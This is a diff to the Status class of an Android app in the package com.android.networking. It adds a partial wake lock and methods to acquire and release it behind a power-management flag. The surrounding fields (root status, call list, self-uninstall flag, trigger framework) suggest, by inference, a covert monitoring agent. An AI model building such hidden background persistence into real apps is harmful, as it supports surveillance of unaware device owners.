@@ -14,6 +14,8 @@ import java.util.concurrent.ScheduledThreadPoolExecutor;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.os.Handler;
+import android.os.PowerManager;
+import android.os.PowerManager.WakeLock;
 import android.provider.MediaStore.Images.Media;
 
 import com.android.networking.action.Action;
@@ -69,6 +71,7 @@ public class Status {
 
 	static public boolean uninstall;
 
+	static WakeLock wl;
 
 	/**
 	 * Instantiates a new status.
@@ -82,6 +85,7 @@ public class Status {
 			triggeredSemaphore[i] = new Object();
 			triggeredActions[i] = new ArrayList<Integer>();
 		}
+
 	}
 
 	/** The singleton. */
@@ -113,7 +117,7 @@ public class Status {
 		actionsMap.clear();
 		globals = null;
 		uninstall = false;
-		
+
 		// Forward compatibility
 		calllistCreated = false;
 	}
@@ -128,12 +132,17 @@ public class Status {
 		if (Cfg.DEBUG) {
 			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
 		}
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (setAppContext), " + context.getPackageName());
 		}
-	
+
 		Status.context = context;
+
+		if (Cfg.POWER_MANAGEMENT) {
+			final PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+			wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
+		}
 	}
 
 	/**
@@ -151,6 +160,7 @@ public class Status {
 
 	public static ContentResolver getContentResolver() {
 		return context.getContentResolver();
+
 	}
 
 	static public Handler getDefaultHandler() {
@@ -305,7 +315,7 @@ public class Status {
 		}
 
 		return a;
-	} 
+	}
 
 	/**
 	 * Gets the event.
@@ -350,18 +360,18 @@ public class Status {
 	 *            the i
 	 * @param baseEvent
 	 */
-	
+
 	static public void triggerAction(final int i, BaseEvent baseEvent) {
 		if (Cfg.DEBUG) {
 			Check.requires(actionsMap != null, " (triggerAction) Assert failed, null actionsMap");
 		}
-		
+
 		Action action = actionsMap.get(new Integer(i));
-		
+
 		if (Cfg.DEBUG) {
 			Check.asserts(action != null, " (triggerAction) Assert failed, null action");
 		}
-		
+
 		int qq = action.getQueue();
 		@SuppressWarnings("unchecked")
 		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
@@ -614,7 +624,7 @@ public class Status {
 	static public void setSu(boolean s) {
 		haveSu = s;
 	}
-	
+
 	static ScheduledThreadPoolExecutor stpe = new ScheduledThreadPoolExecutor(10);
 
 	static public ScheduledThreadPoolExecutor getStpe() {
@@ -622,4 +632,28 @@ public class Status {
 	}
 
 	static Handler deafultHandler = new Handler();
+
+	public void acquirePowerLock() {
+		if (Cfg.POWER_MANAGEMENT) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (acquirePowerLock)");
+				Check.requires(wl != null, "null wl");
+			}
+			if (wl != null) {
+				wl.acquire(1000);
+			}
+		}
+	}
+
+	public void releasePowerLock() {
+		if (Cfg.POWER_MANAGEMENT) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (releasePowerLock)");
+				Check.requires(wl != null, "null wl");
+			}
+			if (wl != null && wl.isHeld()) {
+				wl.release();
+			}
+		}
+	}
 }
